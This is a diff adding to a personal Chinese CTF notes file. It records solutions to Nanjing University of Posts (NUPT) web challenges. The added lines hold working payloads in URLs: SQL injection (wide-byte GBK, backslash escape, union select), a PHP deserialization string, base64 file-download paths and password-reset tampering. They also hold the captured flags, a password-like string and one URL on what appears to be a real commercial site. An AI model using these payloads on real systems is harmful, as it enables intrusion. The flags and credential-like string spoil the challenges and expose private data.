@@ -133,7 +133,7 @@ fnmatch:文件名需要以file://开头
 4.impossible
 }
 
-sqlin
+sqli
 {
 	
 }
@@ -411,3 +411,63 @@ pentesterlabII
 		}
 	}
 }
+
+橡木盾CTF平台
+{
+绩9iRVJRz%!a7#mdvY
+
+}
+
+南邮CTF-writeup
+{
+三个老斯基来1发
+19920211
+
+game19
+http://way.nuptzj.cn/web6/
+http://way.nuptzj.cn/web6/download.php?url=ZG93bmxvYWQucGhw
+way.nuptzj.cn/web6/download.php?url=aGVyZWlza2V5LnBocA==
+nctf{download_any_file_666}
+
+sql injection 3
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27 or 1=1 union select flag from flag %23
+
+
+system
+tips:其他题目的源码我也放出来了，题目地址：http://139.199.71.170:44227/
+
+github:https://github.com/otakekumi/NUPT_Challenges
+
+虽然可以直接来这儿找，但还是好好做吧，来源：CSAW2016，汉化来自:Jarvis OJ
+
+http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php
+http://www.backstagecommerce.ca/services.php?id=4
+
+密码重置
+http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D
+user=admin&newpass=1234&vcode=1234
+nctf{reset_password_often_have_vuln}
+
+php 反序列化
+http://115.28.150.176/php1/index.php?pass=O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}
+nctf{serialize_and_unserialize}
+
+
+sql injection 4
+300
+http://chinalover.sinaapp.com/web15/index.php?username=\&password=or%201%3D1%20%23
+flag:nctf{sql_injection_is_interesting}
+
+综合题
+300
+1bc29b36f623ba82aaf6724fd3b16718.php
+http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history
+flagbak.zip
+flag is:nctf{bash_history_means_what}
+
+sql注入II
+http://4.chinalover.sinaapp.com/web6/index.php
+user=' union select md5(1)#&pass=1
+ntcf{union_select_is_wtf}
+}
+
